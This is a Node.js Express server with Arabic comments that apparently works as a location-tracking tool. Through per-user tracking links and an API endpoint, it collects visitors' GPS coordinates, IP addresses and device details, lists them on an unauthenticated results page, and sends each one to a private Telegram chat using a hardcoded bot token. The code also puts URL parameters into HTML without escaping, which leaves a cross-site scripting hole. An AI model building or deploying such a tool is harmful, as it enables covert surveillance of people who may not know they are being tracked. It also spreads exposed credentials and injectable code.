const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('.'));

// بيانات التخزين
let locations = [];

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// صفحة التتبع
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    const lat = req.query.lat || '0';
    const lon = req.query.lon || '0';
    
    // إرسال صفحة التتبع مع البيانات
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>🚀 تتبع الموقع</title>
            <style>
                body {
                    background: #0f0f23;
                    color: white;
                    font-family: Arial;
                    text-align: center;
                    padding: 50px;
                }
                .container {
                    max-width: 500px;
                    margin: auto;
                    background: rgba(255,255,255,0.1);
                    padding: 30px;
                    border-radius: 20px;
                    border: 2px solid #00ff88;
                }
                .btn {
                    background: #00ff88;
                    color: #001a0f;
                    padding: 15px 30px;
                    border-radius: 10px;
                    text-decoration: none;
                    font-weight: bold;
                    margin: 10px;
                    display: inline-block;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام التتبع</h1>
                <p>رقم المستخدم: ${userId}</p>
                <p>الإحداثيات: ${lat}, ${lon}</p>
                <br>
                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" class="btn">
                    🗺️ عرض على الخريطة
                </a>
                <br><br>
                <a href="/" class="btn">🏠 العودة للرئيسية</a>
            </div>
        </body>
        </html>
    `);
});

// API لحفظ الموقع وإرسال للبوت
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA'),
            userAgent: req.headers['user-agent']
        };
        
        // حفظ في المصفوفة
        locations.push(locationData);
        
        console.log('📍 موقع جديد:', {
            lat: locationData.latitude,
            lon: locationData.longitude,
            accuracy: locationData.accuracy,
            source: locationData.source
        });
        
        // إرسال إشعار للتلجرام
        const telegramSent = await sendTelegramNotification(locationData);
        
        res.json({
            success: true,
            message: 'تم حفظ الموقع وإرساله للبوت',
            telegram_sent: telegramSent,
            count: locations.length
        });
        
    } catch (error) {
        console.error('❌ خطأ:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// دالة إرسال إشعار للتلجرام
async function sendTelegramNotification(locationData) {
    try {
        const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
        const TELEGRAM_CHAT_ID = '8391968596';
        
        const mapUrl = `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`;
        
        const message = `
📍 **موقع GPS جديد تم تحديده**

📌 **الإحداثيات:**
• خط العرض: ${locationData.latitude.toFixed(6)}
• خط الطول: ${locationData.longitude.toFixed(6)}

🎯 **الدقة:** ${Math.round(locationData.accuracy)} متر
📡 **المصدر:** ${locationData.source || 'GPS مباشر'}
⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
🌐 **IP:** ${locationData.ip || 'غير معروف'}
📱 **الجهاز:** ${locationData.userAgent?.substring(0, 50)}...

🗺️ [عرض على خرائط Google](${mapUrl})
        `;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: false
            })
        });
        
        const data = await response.json();
        return data.ok;
        
    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error.message);
        return false;
    }
}

// صفحة لعرض المواقع
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; margin-top: 20px; }
                th, td { padding: 15px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; color: white; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>📊 المواقع المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            
            ${locations.length === 0 ? `
                <p style="text-align:center;margin-top:50px;">لا توجد مواقع مسجلة بعد</p>
            ` : `
                <table>
                    <tr>
                        <th>الوقت</th>
                        <th>الإحداثيات</th>
                        <th>الدقة</th>
                        <th>الخريطة</th>
                    </tr>
                    ${locations.slice().reverse().map(loc => `
                        <tr>
                            <td>${loc.time}</td>
                            <td>${loc.latitude?.toFixed(6) || '--'}, ${loc.longitude?.toFixed(6) || '--'}</td>
                            <td>${loc.accuracy ? Math.round(loc.accuracy) + ' متر' : '--'}</td>
                            <td>
                                <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#00ff88;">
                                    🗺️ عرض
                                </a>
                            </td>
                        </tr>
                    `).join('')}
                </table>
            `}
        </body>
        </html>
    `);
});

// تشغيل السيرفر
app.listen(PORT, () => {
    console.log(`
    ====================================
    🚀 السيرفر يعمل على المنفذ ${PORT}
    🌐 http://localhost:${PORT}
    🤖 البوت: @Arab9919_bot
    📍 إرسال GPS مباشر للبوت
    ====================================
    `);
});
